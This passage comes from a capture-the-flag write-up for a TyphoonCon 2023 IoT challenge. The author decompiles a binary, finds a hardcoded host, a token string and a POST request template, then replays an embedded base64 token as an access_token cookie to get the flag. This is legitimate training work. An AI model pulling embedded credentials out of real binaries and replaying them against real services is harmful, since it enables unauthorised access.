This told me that there is some kind of authentication here. When I tried decoding the rest of the strings I saw that none of them gave any results that were readable so I continued analyzing the main function. The next interesting part of code was:

```
  local_d10 = "https_post";
  local_d08 = "typhoonconctf-2023-dumb-internet-of-things.chals.io";
  local_d00 = &DAT_1200f8178;
  local_cf8 =  "aadasnlnflanslfnlla@lkn24lnn1.knlk12n4knl0lsslkafnal.loiytyyb2bjbbjbfwakmf2uyafikw21ekjrb1kjbgike jbcavkakjfjk" ;
  local_cf0 =  "POST /sensordata HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\nCookie: access_token=%s\r\n\r\n%s"
```

At this point it is easy to realize that this binary sends a post request to the site with a specific cookie value. The first idea I had was that the cookie value was one of the base64 strings mentioned earlier so I set one of the base64 strings as a cookie named `access_token` and accessed `typhoonconctf-2023-dumb-internet-of-things.chals.io/sensordata` where I found the flag:

![alt text](./flagsite.png "Flag on the site after authenticating successfully")


